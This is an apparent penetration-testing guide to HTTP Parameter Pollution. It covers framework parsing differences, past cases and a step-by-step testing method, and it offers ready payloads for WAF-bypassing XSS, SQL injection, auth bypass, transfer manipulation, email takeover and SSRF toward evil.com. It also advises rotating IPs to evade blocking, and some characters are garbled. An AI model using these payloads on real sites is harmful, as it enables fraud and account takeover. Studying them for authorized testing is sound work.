# Complete Methodology for HTTP Parameter Pollution (HPP) Exploitation

HTTP Parameter Pollution is a web vulnerability that occurs when an attacker injects encoded query string delimiters into existing parameters or adds extra parameters to manipulate application behavior. The core issue stems from the fact that HTTP standards (RFC 3986 and RFC 2396) do not define how web servers should handle multiple HTTP parameters with the same name . Consequently, different web frameworks process duplicate parameters in completely different ways, creating opportunities for exploitation .


## Understanding How Different Frameworks Handle Duplicate Parameters

Before attempting any exploitation, you must understand how your target framework processes duplicate parameters. The behavior varies significantly across technologies :

| Framework / Server | Parsing Behavior | Example Input: `?color=red&color=blue` |
|-------------------|------------------|----------------------------------------|
| ASP.NET / IIS | All occurrences concatenated with comma | `color=red,blue` |
| ASP / IIS | All occurrences concatenated with comma | `color=red,blue` |
| .NET Core / Kestrel | All occurrences concatenated with comma | `color=red,blue` |
| PHP / Apache | Last occurrence only | `color=blue` |
| JSP / Apache Tomcat | First occurrence only | `color=red` |
| JSP / Oracle 10g | First occurrence only | `color=red` |
| Node.js / Express | First occurrence only | `color=red` |
| Python / Zope | All occurrences in List data type | `color=['red','blue']` |
| IBM HTTP Server | First occurrence only | `color=red` |
| Perl / Apache | First occurrence only | `color=red` |

This inconsistency is the foundation of HPP attacks. If a developer assumes only one value will be present but the server behaves differently, security controls can be bypassed .


## Types of HPP Attacks

### Client-Side HPP

Client-side HPP occurs when multiple parameters are injected into a URL, and the browser or frontend application processes them incorrectly . The attacker crafts a malicious link that a victim clicks, leading to security bypasses or forced unintended behavior.

**Example attack URL:**
```
https://example.com/login?user=admin&role=user&role=admin
```

If the application fails to properly validate the parameters, it might grant admin privileges instead of user access .

### Server-Side HPP

Server-side HPP occurs when an attacker sends multiple identical parameters in a request, causing unexpected behavior on the server. This is particularly dangerous in API endpoints and financial transactions .

**Example POST request:**
```
POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded

amount=1000¤cy=USD¤cy=INR
```

If the server incorrectly handles multiple parameters, it might process the last value (INR) or merge values, resulting in unexpected financial transactions .


## Real-World Exploits from Past Years

### 1. ModSecurity SQL Injection Core Rules Bypass (2009)

This was one of the first documented HPP vulnerabilities. The ModSecurity filter blocked the string `select 1,2,3 from table` in a URL like `/index.aspx?page=select 1,2,3 from table`. However, by exploiting parameter concatenation, an attacker could bypass the filter :

**Bypass URL:**
```
/index.aspx?page=select 1&page=2,3 from table
```

The ModSecurity filter checked each parameter individually and did not detect the malicious pattern. However, the application server concatenated the parameters back into the full malicious string: `select 1,2,3 from table` .

### 2. Apple Cups Cross-Site Scripting Vulnerability

A critical XSS vulnerability affected Apple Cups, the printing system used by many Unix systems. The application validation checkpoint could be bypassed by adding an extra parameter :

**Exploit URL:**
```
https://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos=
```

The validation checkpoint only considered the second occurrence (the empty string), so the first `kerberos` parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation resulted in JavaScript code execution under the context of the hosting site .

### 3. Blogger Authentication Bypass

A critical HPP vulnerability in Blogger (the popular blogging platform) allowed malicious users to take ownership of a victim's blog. The flaw resided in the authentication mechanism, where the security check was performed on the first `blogID` parameter, whereas the actual operation used the second occurrence :

**HTTP Request:**
```
POST /add-authors.do HTTP/1.1
[...]

security_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=attacker@email.com&ok=Invite
```

### 4. PayPal Currency Manipulation Vulnerability

A previous vulnerability in PayPal allowed an attacker to modify transaction details using multiple `currency` parameters. By injecting multiple values, an attacker could manipulate exchange rates, leading to financial fraud .

### 5. ASP.NET WAF Bypass with JavaScript Injection (2025)

Recent research demonstrated that simple injection payloads achieved only a 17.6% bypass rate against WAFs, while sophisticated parameter pollution payloads bypassed 70.6% of tested configurations . The most effective technique exploits ASP.NET's comma-concatenation behavior combined with JavaScript's comma operator.

**Payload structure:**
```
/?q=1'&q=alert(1)&q='2
```

ASP.NET concatenates this into: `1',alert(1),'2`. When inserted into a JavaScript context, this becomes syntactically valid JavaScript that executes the alert function .


## Complete Exploitation Methodology

### Step 1: Identify the Target Framework

Before testing for HPP, determine what web framework the target application uses. Methods include:

1. **Check HTTP response headers** for Server, X-Powered-By, or framework-specific headers
2. **Analyze URL patterns** (`.aspx` suggests ASP.NET, `.php` suggests PHP, etc.)
3. **Use Wappalyzer** browser extension or similar technology detection tools
4. **Review error messages** that may reveal stack traces or framework information

### Step 2: Manual HPP Testing Methodology

The most reliable technique for detecting HPP vulnerabilities is manual testing. Automated tools can generate false positives, and in-depth business logic knowledge is necessary .

#### Server-Side HPP Testing Process

For each HTTP parameter you want to test, perform these three requests and compare responses :

**Step A - Baseline request:**
```
GET /page?parameter=original_value HTTP/1.1
```

**Step B - Tampered single value:**
```
GET /page?parameter=HPP_TEST1 HTTP/1.1
```

**Step C - Polluted request with duplicate:**
```
GET /page?parameter=original_value&parameter=HPP_TEST1 HTTP/1.1
```

**Analyze the responses:**
- If response from Step C differs from Step A AND differs from Step B, there is an impedance mismatch that may be exploitable for HPP vulnerabilities 
- If the response matches Step A (first parameter used), the framework takes the first occurrence
- If the response matches Step B (last parameter used), the framework takes the last occurrence
- If the response shows concatenated values (e.g., `original_value,HPP_TEST1`), the framework concatenates parameters

#### Testing JSON Endpoints

For JSON-based APIs, the polluted payload would look like :
```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "search_string": "kittens",
  "search_string": "puppies"
}
```

### Step 3: Client-Side HPP Testing

To test for client-side HPP vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal .

**Testing process:**
1. Submit a payload like `%26HPP_TEST` in a parameter
2. Look for URL-decoded occurrences in the response:
   - `&HPP_TEST`
   - `&HPP_TEST`
3. Pay special attention to responses having HPP vectors within `data`, `src`, `href` attributes, or form actions 

### Step 4: WAF Bypass Testing with Parameter Pollution

When testing against WAF-protected applications, use the following methodology:

**Test different parameter splitting patterns :**

| Payload Type | Example | Expected Success Rate |
|--------------|---------|----------------------|
| Simple injection | `q=';alert(1),'` | ~17.6% |
| Pollution with semicolon | `q=1'+1;let+asd=window&q=def='al'+'ert'` | ~52.9% |
| Pollution with line breaks | `q=1'%0aasd=window&q=def="al"+"ert"` | ~70.6% |

**For ASP.NET targets specifically :**
```
/?q=1'&q=alert(1)&q='2
```
This leverages ASP.NET's comma concatenation (producing `1',alert(1),'2`) combined with JavaScript's comma operator for execution.

**For targets that take the last parameter only (PHP, etc.):**
```
/?q=<script>&q=alert(1)</script>
```
If the WAF only scans the first `q` parameter, the attack bypasses security filters and executes XSS .


## Using Burp Suite for HPP Testing

### Param Miner Extension for Hidden Parameter Discovery

Param Miner is an essential Burp Suite extension for discovering hidden parameters that may be vulnerable to HPP . It uses a built-in wordlist to guess potential hidden inputs and sends requests with and without each parameter to compare responses .

**Installation and setup:**
1. Go to Extensions > BApp Store
2. Search for "Param Miner" and install
3. Set a test scope (Target > Site map > right-click > Add to scope)

**Using Param Miner to discover parameters :**
1. In Burp Suite, open Target > Site map
2. Select the request you want to test (select multiple if needed)
3. Navigate to Extensions > Param Miner > Guess params
4. Choose the type of hidden inputs to discover:
   - Guess GET parameters
   - Guess cookie parameters
   - Guess headers
   - Guess everything!
5. Click OK on the Attack Config dialog
6. View results in Extensions > Installed > Param Miner > Output tab

In Burp Suite Professional, discovered hidden inputs also appear as "Secret input" issues in the Dashboard tab .

### Burp Suite Active Scanning for HPP

Burp Suite Professional includes Active Scan capabilities that can test for parameter pollution issues :

**Configuration recommendations :**
- Enable insertion point optimization
- Use time-based detection for blind vulnerabilities
- Integrate with Burp Collaborator for out-of-band testing

The Active Scan will automatically test injection points including:
- XSS, SQLi, SSTI, SSRF, LFI
- Authentication bypass attempts
- Parameter pollution
- Caching issues

### Manual Request Manipulation in Burp Suite

For precise manual HPP testing :

1. **Intercept a request** containing the parameter you want to test
2. **Duplicate the parameter** in the request (either in URL query string for GET or body for POST)
3. **Modify the values** to test different combinations
4. **Forward the request** and analyze the response

**Example GET request manipulation:**
Original:
```
GET /search?q=product&page=1 HTTP/1.1
```

Modified for HPP testing:
```
GET /search?q=product&page=1&q=HPP_TEST HTTP/1.1
```

**Example POST request manipulation:**
Original:
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=12345
```

Modified for HPP testing:
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&role=user&role=admin&password=12345
```


## Using OWASP ZAP for HPP Testing

OWASP ZAP (Zed Attack Proxy) is a free and open-source alternative to Burp Suite that includes HPP detection capabilities.

**Steps for HPP testing in ZAP:**
1. Configure your browser to use ZAP as a proxy (localhost:8080)
2. Browse the target application to map endpoints
3. Use the Active Scan feature which includes HPP test cases
4. Review alerts for parameter pollution findings


## Testing with Command Line Tools (cURL)

For precise, scriptable testing, use cURL commands :

**Testing parameter behavior:**
```bash
# Test with single parameter
curl -s "https://example.com/page?param=value1"

# Test with duplicate parameters
curl -s "https://example.com/page?param=value1&param=value2"

# Compare responses
```

**Testing with POST data:**
```bash
curl -s -X POST "https://example.com/api/endpoint" \
  -d "param1=value1" \
  -d "param1=value2"
```

**Testing for WAF bypass with ASP.NET technique:**
```bash
curl -s "https://example.com/search?q=1'&q=alert(1)&q='2"
```


## Building Custom HPP Payloads

### For Authentication Bypass

When testing login or authorization mechanisms :
```
POST /auth HTTP/1.1
Host: target.com

username=admin&role=user&role=admin
```

### For Financial/Transaction Manipulation

When testing payment or transfer endpoints :
```
POST /transfer HTTP/1.1
Host: bank.com

amount=100&amount=10000&to=attacker&to=victim
```

### For API Parameter Exploitation

When testing REST APIs :
```
POST /update-profile HTTP/1.1
Host: api.target.com

email=attacker@evil.com&email=victim@target.com
```

### For SSRF (Server-Side Request Forgery)

When testing URL fetch functionality:
```
GET /fetch?url=http://internal-site.com&url=http://evil.com
```

### For SQL Injection WAF Bypass

When WAF blocks standard SQLi payloads :
```
GET /search?q=1'&q=UNION SELECT&q=username,password FROM users--
```


## Analyzing HPP Test Results

### Signs of Successful HPP Exploitation

1. **Privilege escalation** - You gain access to higher-level functions or data
2. **Content injection** - Your injected content appears in the response
3. **Error messages** - Unexpected errors may indicate parsing issues
4. **Behavioral changes** - The application behaves differently than with single parameters
5. **Bypassed validation** - Input that was previously blocked is now accepted

### Documenting Findings

For each HPP vulnerability discovered, document:
- The affected endpoint (full URL)
- The vulnerable parameter name
- The framework behavior observed (first, last, concatenation, array)
- Proof-of-concept request/response
- Business impact assessment
- Recommended remediation


## Common Pitfalls and Troubleshooting

### False Positives

HPP testing can produce false positives if the application has legitimate uses for duplicate parameters. Always verify that the behavior difference actually represents a security issue, not intended functionality .

### Rate Limiting and WAF Blocking

Aggressive HPP testing may trigger rate limiting or WAF blocking. Use appropriate delays between requests and rotate IP addresses if necessary during authorized testing.

### Encoding Issues

Parameters may be URL-encoded by the application. Test with both encoded and unencoded payloads:
- `&` = `%26`
- `=` = `%3D`
- `;` = `%3B`

### Framework Detection Failures

If you cannot definitively identify the framework, test systematically by injecting multiple values and observing which one the application uses. This empirical approach will reveal the parsing behavior even without knowing the underlying technology .


## Mitigation Recommendations for Developers

While this document focuses on exploitation methodology, understanding proper mitigation helps testers identify when fixes are correctly implemented:

1. **Sanitize and validate inputs** - Allow only expected parameters, reject duplicate parameters in requests 

2. **Use strong parsing mechanisms** - Avoid automatic merging of parameters, ensure the backend processes parameters securely 

3. **Enforce server-side security measures** - Implement whitelisting instead of blacklisting, log and monitor multiple occurrences of the same parameter 

4. **Use secure frameworks** - Secure libraries such as Spring Security or Django's request handling mitigate HPP risks 

5. **Parameter normalization** - Implement cache key normalization that strips irrelevant query parameters 

6. **Consistent parameter handling** - Ensure the entire application stack (WAF, load balancer, application server, framework) handles duplicate parameters uniformly. The validated parameter must be the same as the one used in processing 


## References

1. OWASP Web Security Testing Guide - Testing for HTTP Parameter Pollution (WSTG-INPV-04) 
2. Ethiack Research - Bypassing WAFs with JavaScript Injection and Parameter Pollution (August 2025) 
3. T00ls Security Research - Parameter Pollution for XSS WAF Bypass (2025) 
4. GitHub - HTTP Parameter Pollution Labs and Techniques 
5. PortSwigger - Hidden Inputs Discovery with Param Miner 
6. LobeHub - Web Cache Poisoning Testing Methodology 
